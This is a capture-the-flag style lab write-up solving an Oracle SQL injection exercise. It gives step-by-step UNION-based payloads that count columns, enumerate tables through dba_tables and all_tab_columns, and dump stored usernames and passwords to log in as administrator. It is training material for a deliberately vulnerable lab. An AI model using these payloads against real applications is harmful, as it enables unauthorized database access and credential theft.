Created By: Achmad
Year: 2022

Lab: SQL injection attack, listing the database contents on Oracle

QUESTION:
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

    The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

    To solve the lab, log in as the administrator user. 

=======================================
ANALYSIS:
-GOALS: display column username and password and than login with username administrator with UNION attack in category filter

SIMPLE LOGIC UNION:
- SELECT a, b, c FROM table1

-SOLVE: 
1. We don't know, how many columns are displayed on the web. Use ORDER BY [NUMBER] or ORDER BY 1 to count the number of columns displayed. IF when calculating an error occurs then the column number has been skipped.
__________________
|  ' ORDER BY 1-- |
|  ' ORDER BY 2-- |
|  ' ORDER BY 3-- |
|__etc.___________|

2. Use UNION to combine SELECT query with column NULL
3. Select NULL value: ' UNION SELECT NULL,NULL FROM DUAL -- "USE SPCASE FOR GENERAL COMMENT"
4. Select the user used by the website, because the default user in oracle has too many variants: ' UNION SELECT NULL, USER FROM DUAL -- "USE SPCASE FOR GENERAL COMMENT"

## Kalau check user yang terbaru berdasarkan ID terbesar yang berurutan: ' UNION SELECT (USER_ID||''), (USERNAME||'<--->'||CREATED) FROM all_users: Hasilnya kurang tepat
## kalau kita select beberapa table randon pada " ' UNION SELECT table_name,owner FROM dba_tables " muncul banyak user dan kalau select pada table yang bukan usernya maka bernilai null

5. Search tables base on the user used on the website: ' UNION SELECT table_name,owner from dba_tables WHERE OWNER='SYSTEM' -- "SPACE"

# Search table name USER/USERS yang tidak menggunakan tanda $ (Biasanya tanda $ digunakan untuk table system ataupun table temporary manual)

6. Select column name & merge by commenting the query behind it: ' UNION SELECT NULL,column_name FROM all_tab_columns WHERE UPPER(table_name)='USERS_CRNBXQ' ORDER BY 1 -- "SPCAE"
7. Select table name: ' UNION SELECT PASSWORD_MONLTY, USERNAME_XZCVIN FROM USERS_CRNBXQ ORDER BY 1 -- "SPCAE"


FULL LOGIC UNION:
- SELECT a, b, c FROM table1 where category='Gifts' UNION SELECT NULL,column_name FROM all_tab_columns WHERE UPPER(table_name)='USERS_CRNBXQ' ORDER BY 1 -- "SPCAE"'
- SELECT a, b, c FROM table1 where category='Gifts' UNION SELECT PASSWORD_MONLTY, USERNAME_XZCVIN FROM USERS_CRNBXQ ORDER BY 1 -- "SPCAE"'